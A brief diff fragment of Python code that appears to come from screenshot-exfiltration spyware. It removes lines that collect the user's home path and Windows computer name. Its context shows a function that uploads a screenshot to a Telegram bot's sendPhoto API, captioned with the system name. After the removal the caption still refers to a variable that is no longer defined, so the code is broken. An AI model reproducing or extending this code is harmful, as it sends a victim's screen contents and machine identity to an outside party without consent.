@@ -1,5 +1,3 @@
-                user = os.path.expanduser("~")
-                system_name = os.getenv('COMPUTERNAME')
                 def send_message_to_group(chat_id, screenshot):
                     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
                     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\n"}
